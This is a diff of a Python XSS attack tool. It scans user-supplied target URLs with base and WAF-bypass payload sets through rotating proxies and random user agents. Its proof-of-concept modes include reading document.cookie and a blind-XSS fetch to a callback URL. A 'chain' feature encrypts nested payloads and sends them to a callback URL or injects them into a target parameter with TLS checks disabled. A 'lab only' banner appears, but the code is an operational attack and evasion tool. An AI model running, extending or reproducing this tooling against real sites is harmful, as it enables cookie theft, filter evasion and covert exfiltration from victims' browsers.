-        print(f"\n  {C.NEO}Working:{C.R} {C.GRN}{', '.join(self.working) or 'none'}{C.R}")
-        print(f"  {C.NEO}Blocked:{C.R} {C.CRM}{', '.join(self.blocked_list) or 'none'}{C.R}")
-
-        if len(self.working) >= 2:
-            self._chain_working()
-        else:
-            print(f"\n  {C.YEL}[!] Few working techniques -> escalation{C.R}")
-
-        if not self.results:
-            self._escalate()
-
-        if on_result:
-            for r in self.results:
-                on_result(r)
+        with ThreadPoolExecutor(max_workers=self.threads) as ex:
+            futs = [ex.submit(work, j) for j in jobs]
+            done = 0
+            for fut in as_completed(futs):
+                done += 1
+                if done % max(1, len(jobs) // 10) == 0 or done == len(jobs):
+                    print(f"\r  {C.GRY}progress {done}/{len(jobs)}  reflected={self.stats['reflected']}{C.R}   ", end="", flush=True)
+                res = fut.result()
+                if res:
+                    with self.lock:
+                        self.results.append(res)
+                    self._print_hit(res)
+        print()
         return self.results
 
-
-def to_json(results, url, marker, method):
-    return json.dumps({
-        "scan_time": datetime.now().isoformat(), "target": url,
-        "method": method, "marker": marker, "alert_type": ALERT_TYPE["mode"],
-        "total": len(results), "findings": results,
-    }, indent=2, ensure_ascii=False)
-
-
-def to_html(results, url, marker, method):
-    import html as H
-    rows = []
-    for i, f in enumerate(results, 1):
-        c = f.get("confirmed")
-        c_txt = "VERIFIED" if c is True else ("REFLECT-ONLY" if c is False else "-")
-        c_col = "#4ade80" if c is True else ("#fbbf24" if c is False else "#9ca3af")
-        rows.append(f"""<tr>
-<td>{i}</td><td>{f['severity']}</td>
-<td style="color:{c_col};font-weight:bold">{c_txt}</td>
-<td>{H.escape(f['method'])}</td>
-<td>{H.escape(f.get('field','-'))}</td>
-<td><code>{H.escape(f['tag'][:80])}</code></td>
-<td>{H.escape(f['context'] or '-')}</td>
-<td><pre>{H.escape(f['payload'][:200])}</pre></td>
-<td>{f['status']}</td></tr>""")
-    body = "".join(rows) or "<tr><td colspan='9'>No findings</td></tr>"
-    return f"""<!DOCTYPE html><html><head><meta charset="utf-8"><title>Report</title>
-<style>body{{font-family:Tahoma;background:#0f0f1e;color:#e0e0e0;padding:30px}}
-h1{{color:#e94560}}table{{width:100%;border-collapse:collapse;background:#16213e}}
-th,td{{padding:10px;text-align:left;border-bottom:1px solid #222;font-size:12px;vertical-align:top}}
-th{{background:#0f0f1e;color:#4ade80}}pre{{background:#0f0f1e;padding:8px;color:#fbbf24;font-size:11px;overflow-x:auto}}
-code{{background:#0f0f1e;padding:3px 8px;color:#9ca3af}}</style></head><body>
-<h1>XSS Report</h1>
-<p>Target: {H.escape(url)} | Method: {H.escape(method)} | Alert: {H.escape(ALERT_TYPE['mode'])} | Findings: {len(results)}</p>
-<table><thead><tr><th>#</th><th>Sev</th><th>Confirmed</th><th>Method</th><th>Field</th>
-<th>Techniques</th><th>Context</th><th>Payload</th><th>Status</th></tr></thead>
-<tbody>{body}</tbody></table></body></html>"""
+    def _print_hit(self, f: Finding):
+        color = C.CRM if f.severity == "critical" else C.LIME if f.severity == "high" else C.YEL
+        conf = ""
+        if f.confirmed is True:
+            conf = f" {C.GRN}BROWSER-CONFIRMED{C.R}"
+        elif f.confirmed is False:
+            conf = f" {C.GRY}browser-neg{C.R}"
+        waf = f" {C.YEL}WAF={f.waf}{C.R}" if f.waf else ""
+        print(
+            f"\n  {color}{C.B}[{f.severity.upper()}]{C.R} {f.field} · {f.tag} · {f.reflection}/{f.context}"
+            f"{conf}{waf}"
+        )
+        print(f"    {C.GRY}{f.payload[:100]}{C.R}")
+        if f.evidence:
+            print(f"    {C.D}…{f.evidence[:90]}…{C.R}")
 
 
-def clear():
-    os.system("clear" if os.name == "posix" else "cls")
-
-
-def banner():
-    clear()
-    print(f"""{C.PUR}{C.B}
-  XSS Scanner
-{C.R}""")
-    print(f"{C.NEO}{C.B}{'XSS Scanner + Smart Payloads + Browser Verify'.center(66)}{C.R}")
-    print(f"{C.CRM}{'LAB ONLY - AUTHORIZED TESTING'.center(66)}{C.R}")
-    chain_ok = ChainAdvanced is not None and callable(hash_password)
-    eng_ok = HAS_XSSPOR and DetectionEngine is not None
-    if eng_ok and chain_ok:
-        print(f"{C.GRN}{'[xsspor OK] [chain OK]'.center(66)}{C.R}\n")
-    elif chain_ok and not eng_ok:
-        print(f"{C.YEL}{'[chain OK] [engine missing — options 5-6 limited]'.center(66)}{C.R}\n")
-    elif eng_ok and not chain_ok:
-        print(f"{C.YEL}{'[xsspor OK] [chain MISSING — pip install cryptography]'.center(66)}{C.R}\n")
+# ── reports ──────────────────────────────────────────────────────────────────
+def reports_dir() -> str:
+    if getattr(sys, "frozen", False):
+        base = os.path.dirname(sys.executable)
     else:
-        print(f"{C.CRM}{'[xsspor/chain MISSING — pip install cryptography]'.center(66)}{C.R}\n")
+        base = os.path.dirname(os.path.abspath(__file__))
+    d = os.path.join(base, "reports")
+    os.makedirs(d, exist_ok=True)
+    return d
 
 
-def print_finding(res):
-    sev = res.get("severity", "LOW")
-    color = C.RED if sev == "HIGH" else (C.YEL if sev == "MEDIUM" else C.GRN)
-    c = res.get("confirmed")
-    if c is True:
-        badge = f"{C.GRN}[VERIFIED]{C.R}"
-    elif c is False:
-        badge = f"{C.YEL}[REFLECT-ONLY]{C.R}"
-    else:
-        badge = f"{C.D}[UNVERIFIED]{C.R}"
-    print(f"  {color}[{sev:<6}]{C.R} {badge} {C.GLD}{res['method']:<4}{C.R} "
-          f"{C.NEO}{res.get('field','-'):<10}{C.R} {C.CYN}{res['context'] or '-':<12}{C.R}")
-    print(f"      {C.D}tech: {res['tag'][:80]}{C.R}")
-    print(f"      {C.WHT}{res['payload'][:140]}{C.R}")
+def save_results(results: List[Finding], url: str, method: str, marker: str) -> str:
+    stamp = int(time.time())
+    path = os.path.join(reports_dir(), f"xss_{stamp}.json")
+    data = {
+        "url": url,
+        "method": method,
+        "marker": marker,
+        "ts": datetime.now(timezone.utc).isoformat(),
+        "count": len(results),
+        "findings": [asdict(r) for r in results],
+    }
+    with open(path, "w", encoding="utf-8") as f:
+        json.dump(data, f, indent=2, ensure_ascii=False)
+    # also a short txt
+    tpath = os.path.join(reports_dir(), f"xss_{stamp}.txt")
+    with open(tpath, "w", encoding="utf-8") as f:
+        f.write(f"XSS report — {url} ({method})\nmarker={marker}\n\n")
+        for r in results:
+            f.write(f"[{r.severity}] {r.field} {r.tag} {r.reflection}/{r.context}\n  {r.payload}\n  {r.url}\n\n")
+    return path
 
 
-def ask_attack():
-    print(f"\n{C.NEO}Threads{C.R} {C.D}(default 5){C.R}: ", end="")
-    t = input().strip()
-    threads = int(t) if t.isdigit() else 5
-    threads = max(1, min(20, threads))
-
-    print(f"{C.NEO}Delay sec{C.R} {C.D}(default 0.2){C.R}: ", end="")
-    d = input().strip()
-    try: delay = float(d) if d else 0.2
-    except ValueError: delay = 0.2
-
-    print(f"\n{C.NEO}Send mode{C.R}")
-    print(f"  {C.GLD}1{C.R}  Auto (all at once)")
-    print(f"  {C.GLD}2{C.R}  Batched")
-    print(f"  {C.GLD}3{C.R}  Manual")
-    print(f"{C.GLD}>>{C.R} ", end="")
-    mode = input().strip() or "1"
-
-    batch_size = 0; manual = False
-    if mode == "2":
-        print(f"{C.NEO}Batch size{C.R} {C.D}(e.g. 100){C.R}: ", end="")
-        b = input().strip()
-        batch_size = int(b) if b.isdigit() and int(b) > 0 else 100
-    elif mode == "3":
-        manual = True
-
-    return threads, delay, batch_size, manual
+# ── interactive prompts ──────────────────────────────────────────────────────
+def ask_alert_type():
+    box("Payload PoC style", [
+        ("1", f"alert('marker')             {C.GRY}unique tracker{C.R}"),
+        ("2", f"alert(document.domain)       {C.GRY}default{C.R}"),
+        ("3", f"alert(document.cookie)       {C.GRY}session PoC{C.R}"),
+        ("4", f"alert(window.location.href)  {C.GRY}forensic{C.R}"),
+        ("5", f"fetch → callback URL         {C.GRY}blind XSS{C.R}"),
+    ])
+    m = prompt(">>", "2")
+    ALERT_MODE["mode"] = {
+        "1": "unique", "2": "domain", "3": "cookie", "4": "location", "5": "callback"
+    }.get(m, "domain")
+    if ALERT_MODE["mode"] == "callback":
+        ALERT_MODE["callback"] = prompt("Callback URL", "https://example.com/xss")
 
 
-def save_results(results, url, marker, method):
-    if not results: return
-    print(f"\n{C.GLD}Save report?{C.R} {C.D}(y/n){C.R}: ", end="")
-    if input().strip().lower() != "y": return
-    os.makedirs("output", exist_ok=True)
-    ts = int(time.time())
-    jp = f"output/xss_{ts}.json"
-    hp = f"output/xss_{ts}.html"
-    with open(jp, "w", encoding="utf-8") as f: f.write(to_json(results, url, marker, method))
-    with open(hp, "w", encoding="utf-8") as f: f.write(to_html(results, url, marker, method))
-    print(f"  {C.GRN}[+] JSON: {jp}{C.R}")
-    print(f"  {C.GRN}[+] HTML: {hp}{C.R}")
-
-
-def run_scan(method_type="GET", adaptive=False):
-    label = "ADAPTIVE BYPASS" if adaptive else "NORMAL"
-    print(f"\n{C.PUR}{'='*70}{C.R}")
-    print(f"{C.B}{C.WHT}  {method_type} {label} SCAN{C.R}")
-    print(f"{C.PUR}{'='*70}{C.R}\n")
-
-    url = input(f"{C.NEO}Target URL{C.R}\n{C.GLD}>>{C.R} ").strip()
-    if not url: return
-    if not url.startswith(("http://","https://")): url = "http://" + url
-
-    data = None
-    if method_type == "POST":
-        print(f"\n{C.NEO}POST fields{C.R} {C.D}(name=value, comma separated){C.R}")
-        print(f"{C.GLD}>>{C.R} ", end="")
-        raw = input().strip()
-        data = {}
-        for part in raw.split(","):
-            if "=" in part:
-                k, v = part.split("=", 1); data[k.strip()] = v.strip()
-        if not data:
-            print(f"{C.CRM}[!] No valid fields{C.R}")
-            input(f"\n{C.D}Enter...{C.R}"); return
-
-    ask_alert_type()
-    pool = ask_proxies()
-    threads, delay, batch, manual = ask_attack()
-
-    USE_BROWSER_VERIFY["enabled"] = ask_browser_verify()
-    if USE_BROWSER_VERIFY["enabled"]:
-        print(f"  {C.GRN}[+] Browser verification ENABLED{C.R}")
-    else:
-        print(f"  {C.YEL}[!] Browser verification DISABLED (fast mode){C.R}")
-
-    try:
-        if adaptive:
-            sc = AdaptiveBypass(url, method=method_type, data=data,
-                                pool=pool, threads=threads, delay=delay)
+def ask_scan_tuning() -> Tuple[int, float, bool]:
+    threads = int(prompt("Threads", "6") or "6")
+    delay = float(prompt("Delay (sec)", "0.15") or "0.15")
+    browser = False
+    if HAS_PLAYWRIGHT:
+        browser = yn("Confirm with Playwright browser", False)
+        if browser:
+            status_line("browser verification ON (slower, accurate)", "ok")
         else:
-            sc = BypassScanner(url, method=method_type, data=data,
-                               pool=pool, threads=threads, delay=delay,
-                               batch_size=batch)
-    except ValueError as e:
-        print(f"{C.CRM}[!] {e}{C.R}")
-        input(f"\n{C.D}Enter...{C.R}"); return
-
-    print(f"\n{C.PUR}{'='*70}{C.R}")
-    print(f"{C.B}{C.WHT}  SCAN START{C.R}")
-    print(f"{C.PUR}{'='*70}{C.R}\n")
-
-    start = time.time()
-    if adaptive:
-        results = sc.scan(on_result=print_finding)
+            status_line("reflection-only mode (fast)", "info")
     else:
-        results = sc.scan(on_result=print_finding, manual=manual)
-    elapsed = time.time() - start
-
-    print(f"\n{C.PUR}{'='*70}{C.R}")
-    print(f"{C.B}{C.WHT}  COMPLETE{C.R}")
-    print(f"{C.PUR}{'='*70}{C.R}\n")
-    print(f"  {C.NEO}Time:      {C.R}{elapsed:.2f}s")
-    print(f"  {C.NEO}Sent:      {C.R}{sc.counter['sent']}")
-    print(f"  {C.NEO}OK:        {C.R}{C.GRN}{sc.counter['ok']}{C.R}")
-    print(f"  {C.NEO}Blocked:   {C.R}{C.YEL}{sc.counter['blocked']}{C.R}")
-    print(f"  {C.NEO}Errors:    {C.R}{sc.counter['errors']}")
-    print(f"  {C.NEO}Reflected: {C.R}{C.GRN}{sc.counter['reflected']}{C.R}")
-    print(f"  {C.NEO}Verified:  {C.R}{C.GRN}{sc.counter.get('verified',0)}{C.R}")
-    print(f"  {C.NEO}Proxies:   {C.R}{sc.pool.alive()}/{sc.pool.total()} alive")
-
-    if adaptive:
-        if sc.working:
-            print(f"\n  {C.GRN}[+] Working: {', '.join(sc.working)}{C.R}")
-        if sc.blocked_list:
-            print(f"  {C.CRM}[-] Blocked: {', '.join(sc.blocked_list[:8])}{C.R}")
-    elif hasattr(sc, "waf_hits") and sc.waf_hits:
-        print(f"\n  {C.GLD}Top blocking:{C.R}")
-        for tag, count in sorted(sc.waf_hits.items(), key=lambda x: -x[1])[:5]:
-            print(f"    {C.CRM}{count:>4}x {C.R}{tag[:60]}")
-
-    if results:
-        verified = [r for r in results if r.get("confirmed") is True]
-        reflect_only = [r for r in results if r.get("confirmed") is False]
-        print(f"\n{C.GRN}{C.B}[+] {len(results)} findings!{C.R}")
-        if verified:
-            print(f"  {C.GRN}[+] VERIFIED XSS: {len(verified)}{C.R}")
-        if reflect_only:
-            print(f"  {C.YEL}[x] Reflect-only: {len(reflect_only)}{C.R}")
-        by_sev = {}
-        for r in results: by_sev[r["severity"]] = by_sev.get(r["severity"], 0) + 1
-        for sev in ("HIGH","MEDIUM","LOW"):
-            if sev in by_sev:
-                print(f"  {C.GLD}{sev}{C.R}: {by_sev[sev]}")
-        save_results(results, url, sc.marker, sc.method)
-    else:
-        print(f"\n{C.YEL}[!] No findings{C.R}")
-
-    input(f"\n{C.D}Enter...{C.R}")
+        status_line("Playwright not installed — reflection only", "warn")
+    return max(1, threads), max(0.0, delay), browser
 
 
-def run_advanced_engine(method_type="GET"):
-    """Run the new modular DetectionEngine from xsspor package."""
-    if not _require_xsspor("xsspor package"):
-        input(f"\n{C.D}Enter...{C.R}")
-        return
-
-    print(f"\n{C.PUR}{'='*70}{C.R}")
-    print(f"{C.B}{C.WHT}  ADVANCED ENGINE ({method_type}) — 3-Layer Detection{C.R}")
-    print(f"{C.PUR}{'='*70}{C.R}\n")
-
-    url = input(f"{C.NEO}Target URL{C.R}\n{C.GLD}>>{C.R} ").strip()
+def ask_target(method: str) -> Tuple[str, Dict[str, str]]:
+    url = normalize_url(prompt("Target URL"))
     if not url:
+        status_line("empty URL", "err")
+        return "", {}
+    data: Dict[str, str] = {}
+    if method.upper() == "POST":
+        status_line("POST body — JSON {\"a\":1} or a=1&b=2 (empty = auto q=test)", "info")
+        raw = prompt("Body", "")
+        data = parse_post_body(raw)
+    # optional: let user pick / add fields
+    fields_preview = params_from_url(url) if method.upper() == "GET" else list(data.keys())
+    if fields_preview:
+        status_line("fields: " + ", ".join(fields_preview), "info")
+    else:
+        status_line("no fields yet — will auto-seed q=test", "warn")
+    extra = prompt("Extra field names (comma, optional)", "")
+    if extra:
+        for name in extra.split(","):
+            name = name.strip()
+            if not name:
+                continue
+            if method.upper() == "GET":
+                if name not in params_from_url(url):
+                    join = "&" if "?" in url else "?"
+                    url = url + join + f"{name}=test"
+            else:
+                data.setdefault(name, "test")
+    return url, data
+
+
+# ── scan runners ─────────────────────────────────────────────────────────────
+def run_scan(method: str = "GET", bypass: bool = False):
+    banner()
+    title = f"{'BYPASS' if bypass else 'NORMAL'} · {method}"
+    print(f"  {C.B}{title}{C.R}\n")
+    ask_alert_type()
+    url, data = ask_target(method)
+    if not url:
+        pause()
         return
-    if not url.startswith(("http://", "https://")):
-        url = "http://" + url
+    pool = ask_proxies()
+    threads, delay, browser = ask_scan_tuning()
 
-    data = None
-    if method_type == "POST":
-        print(f"\n{C.NEO}POST fields{C.R} {C.D}(name=value, comma separated){C.R}")
-        print(f"{C.GLD}>>{C.R} ", end="")
-        raw = input().strip()
-        data = {}
-        for part in raw.split(","):
-            if "=" in part:
-                k, v = part.split("=", 1)
-                data[k.strip()] = v.strip()
-        if not data:
-            print(f"{C.CRM}[!] No valid fields{C.R}")
-            input(f"\n{C.D}Enter...{C.R}")
-            return
-
-    print(f"{C.NEO}Threads{C.R} {C.D}(default 3){C.R}: ", end="")
-    t = input().strip()
-    threads = int(t) if t.isdigit() else 3
-    threads = max(1, min(20, threads))
-
-    print(f"{C.NEO}Delay sec{C.R} {C.D}(default 0.5){C.R}: ", end="")
-    d = input().strip()
     try:
-        delay = float(d) if d else 0.5
-    except ValueError:
-        delay = 0.5
-
-    print(f"{C.NEO}Browser verify?{C.R} {C.D}(y/n, default n){C.R}: ", end="")
-    browser_verify = input().strip().lower() == "y"
-
-    print(f"{C.NEO}Smart context?{C.R} {C.D}(y/n, default y){C.R}: ", end="")
-    smart = input().strip().lower() != "n"
-
-    # optional crawl
-    print(f"{C.NEO}Crawl for more params?{C.R} {C.D}(y/n, default n){C.R}: ", end="")
-    do_crawl = input().strip().lower() == "y"
-    extra_urls = []
-    if do_crawl:
-        try:
-            extra_urls = xss_crawl(url, depth=1, max_urls=20)
-            print(f"  {C.GRN}[+] Found {len(extra_urls)} parameterized URLs{C.R}")
-        except Exception as e:
-            print(f"  {C.YEL}[!] Crawl error: {e}{C.R}")
-
-    config = ScanConfig(
-        url=url,
-        method=method_type,
-        data=data,
-        threads=threads,
-        delay=delay,
-        browser_verify=browser_verify,
-        smart_context=smart,
-    )
-
-    def on_finding(f: Finding):
-        color = C.RED if f.severity in ("CRITICAL", "HIGH") else (
-            C.YEL if f.severity == "MEDIUM" else C.GRN
+        eng = XSSScanner(
+            url=url, method=method, data=data, pool=pool,
+            threads=threads, delay=delay, browser_verify=browser,
         )
-        conf = f.confirmed
-        if conf is True:
-            badge = f"{C.GRN}[VERIFIED]{C.R}"
-        elif conf is False:
-            badge = f"{C.YEL}[REFLECT]{C.R}"
-        else:
-            badge = f"{C.D}[?]{C.R}"
-        print(f"  {color}[{f.severity:<8}]{C.R} {badge} "
-              f"{C.GLD}{f.method:<4}{C.R} {C.NEO}{f.field:<12}{C.R} "
-              f"{C.CYN}{f.context:<12}{C.R} {C.D}{f.category}{C.R}")
-        print(f"      {C.WHT}{f.payload[:120]}{C.R}")
-
-    try:
-        engine = DetectionEngine(config)
-        print(f"\n{C.PUR}{'='*70}{C.R}")
-        print(f"{C.B}{C.WHT}  SCAN START (Advanced Engine){C.R}")
-        print(f"{C.PUR}{'='*70}{C.R}\n")
-        start = time.time()
-        findings = engine.scan(on_finding=on_finding)
-        elapsed = time.time() - start
-
-        print(f"\n{C.PUR}{'='*70}{C.R}")
-        print(f"{C.B}{C.WHT}  COMPLETE{C.R}")
-        print(f"{C.PUR}{'='*70}{C.R}\n")
-        print(f"  {C.NEO}Time:      {C.R}{elapsed:.2f}s")
-        print(f"  {C.NEO}Sent:      {C.R}{engine.stats['sent']}")
-        print(f"  {C.NEO}OK:        {C.R}{C.GRN}{engine.stats['ok']}{C.R}")
-        print(f"  {C.NEO}Errors:    {C.R}{engine.stats['errors']}")
-        print(f"  {C.NEO}Reflected: {C.R}{C.GRN}{engine.stats['reflected']}{C.R}")
-        print(f"  {C.NEO}Confirmed: {C.R}{C.GRN}{engine.stats['confirmed']}{C.R}")
-
-        if findings:
-            print(f"\n{C.GRN}{C.B}[+] {len(findings)} findings{C.R}")
-            by_sev = {}
-            for f in findings:
-                by_sev[f.severity] = by_sev.get(f.severity, 0) + 1
-            for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
-                if sev in by_sev:
-                    print(f"  {C.GLD}{sev}{C.R}: {by_sev[sev]}")
-
-            # save
-            print(f"\n{C.GLD}Save report?{C.R} {C.D}(y/n){C.R}: ", end="")
-            if input().strip().lower() == "y":
-                os.makedirs("output", exist_ok=True)
-                ts = int(time.time())
-                jp = f"output/xss_adv_{ts}.json"
-                data_out = {
-                    "url": url,
-                    "method": method_type,
-                    "marker": engine.marker,
-                    "stats": engine.stats,
-                    "findings": [f.to_dict() for f in findings],
-                }
-                with open(jp, "w", encoding="utf-8") as fh:
-                    json.dump(data_out, fh, indent=2, ensure_ascii=False)
-                print(f"  {C.GRN}[+] JSON: {jp}{C.R}")
-        else:
-            print(f"\n{C.YEL}[!] No findings{C.R}")
     except ValueError as e:
-        print(f"{C.CRM}[!] {e}{C.R}")
-    except Exception as e:
-        print(f"{C.CRM}[!] Error: {e}{C.R}")
-
-    input(f"\n{C.D}Enter...{C.R}")
-
-
-
-# ═══════════════════════════════════════════════════════════════════
-#  Chain features (from aac2 / Nested Chain)
-# ═══════════════════════════════════════════════════════════════════
-
-CHAIN_CALLBACK = {"url": "", "password": "", "enabled": False, "compress": True}
-
-
-def print_header(title: str) -> None:
-    print(f"\n{C.PUR}{C.B}{'=' * 60}{C.R}")
-    print(f"{C.PUR}{C.B}  {title}{C.R}")
-    print(f"{C.PUR}{C.B}{'=' * 60}{C.R}")
-
-
-def _color_payload(text, idx):
-    colors = [C.GRN, C.CYN, C.YEL, C.PUR, C.GLD, C.NEO, C.CRM]
-    return colors[idx % len(colors)] + str(text) + C.R
-
-
-def _split_payload_stages(payload: str):
-    """Split payload into stage chunks (whitespace). Single token = one stage."""
-    payload = payload if payload is not None else ""
-    parts = [p for p in payload.split(" ") if p != ""]
-    return parts if parts else [""]
-
-
-def send_chain_blob(blob, label="findings"):
-    if not CHAIN_CALLBACK.get("enabled") or ChainAdvanced is None:
-        return False
-    key = hash_password(CHAIN_CALLBACK["password"])
-    salt = os.urandom(16)
-    sender = ChainAdvanced(initial_key=key, session_salt=salt, compress=CHAIN_CALLBACK.get("compress", True))
-    packet = sender.encode(blob if isinstance(blob, bytes) else str(blob).encode())
-    d = packet_to_d(packet)
-    salt_b64 = base64.urlsafe_b64encode(salt).decode().rstrip("=")
-    params = {"c": "aac2", "s": salt_b64, "d": d, "l": label}
-    try:
-        r = requests.get(
-            CHAIN_CALLBACK["url"], params=params, timeout=15,
-            verify=False, allow_redirects=False,
-            headers={"User-Agent": random.choice(USER_AGENTS)},
-        )
-        print(f"{C.GRN}[+] Chain sent ({label}) HTTP {r.status_code}  d_len={len(d)}{C.R}")
-        return True
-    except Exception as e:
-        print(f"{C.CRM}[!] Chain send failed: {str(e)[:120]}{C.R}")
-        return False
-
-
-def chain_self_test():
-    if not _require_xsspor("xsspor/chain"):
+        status_line(str(e), "err")
+        pause()
         return
-    print_header("Chain self-test")
-    pw = input(f"{C.NEO}Password{C.R} {C.D}(default test1234){C.R}: ").strip() or "test1234"
-    key = hash_password(pw)
-    salt = os.urandom(16)
-    sender = ChainAdvanced(initial_key=key, session_salt=salt, compress=True)
-    receiver = ChainAdvanced(initial_key=key, session_salt=salt, compress=True)
-    msg = input(f"{C.NEO}Message{C.R}: ").strip() or "hello"
-    pkt = sender.encode(msg.encode())
-    out = receiver.decode(pkt)
-    print(f"{C.GRN}[+] encode/decode OK: {out!r}{C.R}")
+
+    payloads = bypass_payloads(eng.marker) if bypass else base_payloads(eng.marker)
+    status_line(f"payload set: {len(payloads)} ({'bypass' if bypass else 'base'})", "info")
+    print()
+    results = eng.scan(payloads)
+    print()
+    status_line(
+        f"done — sent={eng.stats['sent']} reflected={eng.stats['reflected']} "
+        f"verified={eng.stats['verified']} errors={eng.stats['errors']} blocked={eng.stats['blocked']}",
+        "ok",
+    )
+    if results:
+        path = save_results(results, eng.url, method, eng.marker)
+        status_line(f"saved {path}", "ok")
+        # severity tally
+        tall = {}
+        for r in results:
+            tall[r.severity] = tall.get(r.severity, 0) + 1
+        print(f"  {C.GRY}" + " · ".join(f"{k}={v}" for k, v in sorted(tall.items())) + f"{C.R}")
+    else:
+        status_line("no reflections — try bypass set or different params", "warn")
+    pause()
+
+
+def run_advanced_engine(method: str = "GET"):
+    banner()
+    print(f"  {C.B}ADVANCED ENGINE (xsspor) · {method}{C.R}\n")
+    if not HAS_XSSPOR:
+        status_line(f"xsspor unavailable: {XSSPOR_ERR}", "err")
+        status_line("falling back to built-in scanner", "warn")
+        run_scan(method=method, bypass=True)
+        return
+    ask_alert_type()
+    url, data = ask_target(method)
+    if not url:
+        pause()
+        return
+    pool = ask_proxies()
+    threads, delay, browser = ask_scan_tuning()
+    url, fields, data = ensure_fields(url, method, data)
+    status_line(f"fields={fields}", "info")
+    try:
+        cfg = ScanConfig(
+            url=url,
+            method=method,
+            data=data or None,
+            threads=threads,
+            delay=delay,
+            browser_verify=browser,
+            smart_context=True,
+        )
+        # attach proxy if supported
+        engine = DetectionEngine(cfg)
+        status_line("xsspor engine running…", "info")
+        findings = engine.run() if hasattr(engine, "run") else engine.scan() if hasattr(engine, "scan") else []
+        if not findings:
+            # fallback probe with built-in if xsspor API differs
+            status_line("xsspor returned empty — built-in fallback", "warn")
+            run_scan(method=method, bypass=True)
+            return
+        status_line(f"findings: {len(findings)}", "ok")
+        for f in findings:
+            print(f"  {C.LIME}{f}{C.R}")
+    except Exception as e:
+        status_line(f"xsspor error: {e}", "err")
+        status_line("built-in fallback", "warn")
+        run_scan(method=method, bypass=True)
+        return
+    pause()
+
+
+# ── chain (nested encrypted payload builder) ─────────────────────────────────
+def chain_self_test():
+    banner()
+    print(f"  {C.B}CHAIN SELF-TEST{C.R}\n")
+    if not HAS_CHAIN:
+        status_line("chain module unavailable (need xsspor.chain + cryptography)", "err")
+        pause()
+        return
+    try:
+        password = prompt("Password", "lab-pass")
+        plain = prompt("Plaintext payload", "<script>alert(1)</script>")
+        c = ChainAdvanced(password) if ChainAdvanced else None
+        if c is None:
+            status_line("ChainAdvanced missing", "err")
+            pause()
+            return
+        # support both APIs
+        if hasattr(c, "encode"):
+            pkt = c.encode(plain.encode() if isinstance(plain, str) else plain)
+            back = c.decode(pkt)
+            if isinstance(back, bytes):
+                back = back.decode(errors="replace")
+            status_line("encode/decode OK" if back == plain else "mismatch", "ok" if back == plain else "err")
+            print(f"  {C.GRY}{pkt}{C.R}")
+        else:
+            status_line("unexpected ChainAdvanced API", "warn")
+    except Exception as e:
+        status_line(str(e), "err")
+    pause()
 
 
 def send_manual_chain():
-    if not _require_xsspor("xsspor/chain"):
+    banner()
+    print(f"  {C.B}CHAIN MANUAL GET{C.R}\n")
+    if not HAS_CHAIN:
+        status_line("chain unavailable", "err")
+        pause()
         return
-    print(f"\n{C.NEO}Manual Chain GET{C.R}")
-    url = input(f"{C.NEO}Callback URL{C.R}: ").strip()
-    if not url.startswith(("http://", "https://")):
-        print(f"{C.CRM}[!] bad url{C.R}")
-        return
-    pw = input(f"{C.NEO}Password{C.R}: ").strip()
-    if not pw:
-        print(f"{C.CRM}[!] empty password{C.R}")
-        return
-    text = input(f"{C.NEO}Plaintext{C.R}: ").strip() or "ping"
-    CHAIN_CALLBACK.update({"url": url, "password": pw, "enabled": True, "compress": True})
-    send_chain_blob(text.encode(), label="manual")
-
-
-def build_hierarchical_chain(layers, compress=True):
-    """
-    Build nested packets with PER-LAYER passwords.
-    layers: outer-first list of dicts {name, password, payload}
-    """
-    if not layers:
-        raise ValueError("no layers")
-
-    child = None
-    built = []
-
-    for idx in range(len(layers) - 1, -1, -1):
-        L = layers[idx]
-        name = L["name"]
-        password = L["password"]
-        payload = L["payload"]
-        key = hash_password(password)
-        salt = os.urandom(16)
-        key_fp = hashlib.sha256(key).hexdigest()
-
-        stages = _split_payload_stages(payload)
-        stage_plain = list(stages)
-
-        transport = ChainAdvanced(initial_key=key, session_salt=salt, compress=compress)
-        body_simple = {
-            "type": "layer",
-            "name": name,
-            "stages": stage_plain,
-            "child": child,
-        }
-        outer_packet = transport.encode(
-            json.dumps(body_simple, ensure_ascii=False, separators=(",", ":")).encode("utf-8")
-        )
-        d = packet_to_d(outer_packet)
-        salt_b64 = base64.urlsafe_b64encode(salt).decode("ascii").rstrip("=")
-        child = {
-            "password": password,
-            "salt": salt_b64,
-            "d": d,
-            "name": name,
-            "key_fp": key_fp,
-            "stage_count": len(stage_plain),
-        }
-        built.append({
-            "name": name,
-            "password": password,
-            "key_fp": key_fp,
-            "salt": salt_b64,
-            "d": d,
-            "stages": stage_plain,
-            "packet": outer_packet,
-        })
-
-    outer = built[-1]
-    return outer, list(reversed(built))
-
-
-def peel_hierarchical(outer_password, outer_salt_b64, outer_d):
-    """Peel nest using only the outermost password."""
-    padding = "=" * ((4 - len(outer_salt_b64) % 4) % 4)
-    salt = base64.urlsafe_b64decode(outer_salt_b64 + padding)
-    key = hash_password(outer_password)
-    current_d = outer_d
-    current_key = key
-    current_salt = salt
-    recovered = []
-
-    for _ in range(64):
-        chain = ChainAdvanced(initial_key=current_key, session_salt=current_salt, compress=True)
-        pkt = d_to_packet(current_d)
-        plain = chain.decode(pkt)
-        obj = json.loads(plain.decode("utf-8"))
-        if obj.get("type") != "layer":
-            raise ValueError("unexpected layer type")
-        name = obj.get("name", "?")
-        stages = obj.get("stages") or []
-        recovered.append({"name": name, "stages": stages})
-        child = obj.get("child")
-        if not child:
-            break
-        current_d = child["d"]
-        current_key = hash_password(child["password"])
-        pad = "=" * ((4 - len(child["salt"]) % 4) % 4)
-        current_salt = base64.urlsafe_b64decode(child["salt"] + pad)
-    return recovered
+    url = normalize_url(prompt("URL (param will be filled)"))
+    param = prompt("Param name", "q")
+    password = prompt("Password", "lab-pass")
+    plain = prompt("Payload", "<script>alert(document.domain)</script>")
+    try:
+        c = ChainAdvanced(password)
+        pkt = c.encode(plain.encode())
+        blob = json.dumps(pkt) if isinstance(pkt, dict) else str(pkt)
+        target = inject_param(url if params_from_url(url) or True else url + "?q=1", param, blob)
+        status_line(f"GET {target[:120]}…", "info")
+        r = requests.get(target, timeout=12, verify=False, headers={"User-Agent": random.choice(USER_AGENTS)})
+        status_line(f"status={r.status_code} len={len(r.content)}", "ok")
+    except Exception as e:
+        status_line(str(e), "err")
+    pause()
 
 
 def send_nested_payloads_chain():
-    """Option 7 — Nested Chain (per-layer passwords)."""
-    if not _require_xsspor("xsspor/chain"):
+    banner()
+    print(f"  {C.B}NESTED CHAIN (per-layer passwords){C.R}\n")
+    if not HAS_CHAIN:
+        status_line("chain unavailable", "err")
+        pause()
         return
-
